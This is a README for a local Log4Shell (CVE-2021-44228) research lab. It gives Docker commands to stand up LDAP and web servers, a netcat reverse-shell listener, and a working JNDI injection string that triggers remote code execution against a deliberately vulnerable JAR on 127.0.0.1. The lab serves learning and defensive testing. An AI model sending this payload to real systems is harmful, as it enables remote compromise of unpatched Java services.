# CVE-2021-44228 Log4Shell Research Lab 🚧

A basic lab environment to test some of the public proof of concepts to trigger and learn more about [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and expedite the time it takes to deploy multiple scenarios.

## Deploy LDAP Reference & Web Servers

### Clone Repo

```
git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```
### Run Docker Compose File

```
cd log4jshell-lab
docker-compose -f docker-compose.yml up --build -d
```

### Check Docker Containers

```
docker ps

docker logs --follow ldap-server
docker logs --follow web-server
```
## Run Basic Test

This scenario simulates an attacker using the log4j RCE vulnerability to get a shell locally (127.0.0.1) via netcat.
We are going to execute everything on the same endpoint where we deployed our attacker's infrastructure.

### Start Netcat Server

```
nc -lvnp 443
```
### Compile Basic JAR

**Dockerized**
```
cd vulnApps/basicJar
docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
```

**Locally**
```
cd vulnApps/basicJar
mvn -f pom.xml clean package -DskipTests
```

### Run Application

```
cd vulnApps/basicJar
java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
```

![](resources/images/log4jshell-trigger-rce-basicjar-reverseshell3.png)

## References
* https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
* https://www.youtube.com/watch?v=Y8a5nB-vy78
* https://github.com/veracode-research/rogue-jndi
* https://community.microfocus.com/cyberres/fortify/f/fortify-discussions/317555/the-perils-of-java-deserialization
* https://www.veracode.com/blog/research/exploiting-jndi-injections-java
* https://github.com/pimps/JNDI-Exploit-Kit
* https://github.com/pimps/ysoserial-modified
* https://ldap.com/ldap-urls/
* https://github.com/pwntester/SerialKillerBypassGadgetCollection
* https://www.ibm.com/docs/en/content-manager/8.5.0?topic=ldap-server-configuration-storing-java-objects
* https://docs.microsoft.com/en-us/windows/win32/ad/enabling-schema-changes-at-the-schema-master
* https://forensicitguy.github.io/analyzing-log4shell-muhstik/